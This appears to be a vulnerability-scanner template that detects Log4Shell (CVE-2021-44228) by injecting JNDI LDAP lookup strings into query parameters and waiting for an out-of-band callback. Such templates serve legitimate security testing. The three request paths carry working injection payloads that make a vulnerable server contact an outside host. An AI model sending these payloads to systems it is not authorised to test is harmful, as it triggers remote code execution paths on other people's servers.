id: log4j-jndi-rce
info:
  name: Log4j JNDI RCE (CVE-2021-44228)
  author: phantomscan
  severity: critical
  description: Blind remote code execution in Apache Log4j via out-of-band JNDI LDAP lookup injection.
  tags: cve,rce,oob,log4j,critical
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  metadata:
    cve-id: CVE-2021-44228
    cvss-score: 10.0

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q=${jndi:ldap://{{oob_url}}}"
      - "{{BaseURL}}/search?query=${jndi:ldap://{{oob_url}}}"
      - "{{BaseURL}}/api/login?username=${jndi:ldap://{{oob_url}}}"
    matchers-condition: and
    matchers:
      - type: oob
        condition: and
